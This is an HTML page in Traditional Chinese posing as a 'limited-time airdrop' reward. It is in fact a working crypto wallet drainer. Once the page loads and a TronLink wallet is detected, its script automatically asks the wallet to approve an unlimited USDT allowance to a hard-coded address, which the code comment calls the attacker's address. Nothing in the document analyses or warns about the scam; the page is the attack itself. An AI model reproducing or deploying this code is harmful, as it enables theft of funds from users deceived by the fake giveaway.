<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>限時空投活動</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <style>
    body { font-family: Arial, text-align: center; padding: 60px; background: #f4f4f4; }
    h1 { color: #333; }
    #status { margin-top: 20px; font-size: 18px; color: #666; }
  </style>
</head>
<body>
  <h1>🎉 恭喜你獲得限時空投！</h1>
  <p id="status">請稍候，正在初始化授權...</p>

  <script>
    const USDT_CONTRACT = "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT"; // TRC20 USDT 主網
    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 攻擊者地址

    const ABI = [{
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    async function autoApprove() {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        document.getElementById("status").innerText = "請使用 TronLink 錢包進入此頁面。";
        return;
      }

      const tronWeb = window.tronWeb;
      const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
      document.getElementById("status").innerText = "⏳ 發送授權中...";

      try {
        const tx = await contract.approve(SPENDER, tronWeb.toBigNumber(2).pow(256).minus(1)).send();
        document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
      } catch (e) {
        document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
      }
    }

    // 等待 TronLink 掛載後執行
    window.addEventListener("load", () => {
      const interval = setInterval(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          clearInterval(interval);
          autoApprove();
        }
      }, 1000);
    });
  </script>
</body>
</html>
